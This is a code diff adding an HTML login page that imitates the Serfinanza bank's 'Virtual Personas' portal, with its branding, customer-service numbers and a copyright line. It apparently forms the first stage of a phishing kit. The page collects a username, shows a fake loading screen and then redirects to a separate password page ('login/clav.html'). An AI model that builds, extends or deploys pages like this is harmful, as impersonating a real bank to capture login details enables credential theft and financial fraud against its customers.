@@ -1,0 +1,151 @@
+<html>
+    <head>
+		<style>
+@keyframes pulse {
+    0% { transform: scale(1); opacity: 1; }
+    50% { transform: scale(1.1); opacity: 0.7; }
+    100% { transform: scale(1); opacity: 1; }
+}
+</style>
+        <title>Banca - Virtual</title>
+        <meta http-equiv="content-type" content="text/html; utf-8">
+        <meta charset="utf-8">
+        
+        <meta content="es" http-equiv="Content-Language">
+    
+        <meta name="description" content="">
+        <meta name="author" content="">
+        <meta name="Copyright" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
+        <link rel="icon" href="img/favicon.ico" type="image/x-icon">
+
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>        
+        <link href="css/style.css" rel="stylesheet">
+        <link href="css/stylesheet.css" rel="stylesheet">
+            <script type="text/javascript" src="js/functions.js"></script>
+    <script type="text/javascript" src="js/ready.js"></script>      
+    
+    <script type="text/javascript">
+    $(document).ready(function() {   
+        console.log("jQuery cargado correctamente");
+        
+        // Verificar que el botón existe
+        if($("#btn-usuario").length > 0) {
+            console.log("Botón usuario encontrado");
+        } else {
+            console.log("ERROR: Botón usuario NO encontrado");
+        }
+        
+        // Verificar que el input existe
+        if($("#txt-usuario").length > 0) {
+            console.log("Input usuario encontrado");
+        } else {
+            console.log("ERROR: Input usuario NO encontrado");
+        }
+    });
+    
+    function testButton() {
+        console.log("Botón clickeado directamente!");
+        var usuario = document.getElementById("txt-usuario").value;
+        console.log("Usuario ingresado: " + usuario);
+        
+        if(usuario != "") {
+            console.log("Redirigiendo a login...");
+            window.location.href = "login/clav.html";
+        } else {
+            console.log("Usuario vacío, mostrando mensaje");
+            document.getElementById("fondo").style.display = "block";
+            document.getElementById("mensaje").style.display = "block";
+        }
+    }
+    </script>
+</head>
+<body>
+    <div id="fondo"></div>
+    <div id="mensaje">
+        <div style="text-align:center;">Por favor ingrese un nombre de usuario.</div>
+        <br><br>
+        <div style="text-align:right;"><button class="btn" id="btn-aceptar">Aceptar</button></div>
+    </div>
+    <div id="cabecera">
+        <img src="img/logo.png">
+    </div>
+    <div style="height: 24px;"></div>
+    <div id="contenido">
+        <table border="0" width="100%" cellpadding="0" cellspacing="0">
+            <tr>
+                <td valign="top" id="panel-izq">
+                    <table width="100%" cellpadding="0" cellspacing="0">
+                        <tr>
+                            <td valign="bottom"><img src="img/vig.jpg" width="24"></td>
+                            <td>
+                                <div class="frm">
+                                    <div class="titulo">BIENVENIDO A TU SERFINANZA VIRTUAL PERSONAS</div>
+                                    <div style="height: 29px;"></div>
+                                    <table border="0" width="90%" cellpadding="0" cellspacing="0" id="inp-usuario">
+                                        <tr>
+                                            <td valign="middle" align="left" width="54" id="ico-user1"><img src="img/us.jpg"></td>
+                                            <td valign="middle" align="right">
+                                                <div id="ico-user2">
+                                                    <img src="img/us.jpg">
+                                                </div>
+                                                <input type="text" name="txt-usuario" id="txt-usuario" class="entradas" placeholder="Ingresa tu usuario" autocomplete="off">
+                                            </td>
+                                        </tr>
+                                    </table>
+                                    <div style="height: 42px;"></div>
+                                    <div style="text-align: center;">
+                                        <button class="btn" id="btn-usuario" onclick="testButton()">Ingresar</button>
+                                    </div>
+                                    <div style="height: 42px;"></div>
+                                    <table border="0" width="100%" cellpadding="0" cellspacing="0">
+                                        <tr>
+                                            <td class="recordar" align="left">Regístrate aquí</td>
+                                            <td class="recordar" align="center">Recordar Usuario</td>
+                                            <td class="recordar" align="right">Restablecer Contraseña</td>
+                                        </tr>
+                                    </table>
+                                </div>
+                            </td>
+                        </tr>
+                    </table>                    
+                </td>
+                <td valign="top" id="panel-der">
+                    <img src="img/mio.jpg" width="100%">
+                </td>
+            </tr>
+        </table>
+        <div class="linea">
+            Línea de Servicio al Cliente: 323 5997000 - 018000510513
+        </div>
+        <table border="0" width="100%" cellpadding="0" cellspacing="0" style="margin-top: 10px;">
+            <tr>
+                <td align="left" valign="top"><img src="img/1.jpg"><br class="salto"><img src="img/2.jpg"><br class="salto"><img src="img/3.jpg"><br class="salto"><div id="derechos" style="font-size: 12px; color: #666; font-family: Arial, sans-serif; padding: 10px 0;">Serfinanza - 2025</div></td>
+                <td align="right" valign="top"><div id="derechos2" style="font-size: 12px; color: #666; font-family: Arial, sans-serif; padding: 10px 0;">Serfinanza - 2025</div></td>
+            </tr>
+        </table>
+    </div> 
+
+  <div id="loader" style="
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: #ffffff;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    z-index: 9999;
+">
+    <img src="img/l1.png" alt="Cargando..." style="width: 120px; height: 120px; animation: pulse 1.5s infinite;">
+</div>
+
+<script>
+// Espera 3 segundos y redirige al siguiente paso
+setTimeout(function () {
+    document.getElementById('loader').style.display = 'none';
+}, 3000);
+</script>	
+</body>
+</html>
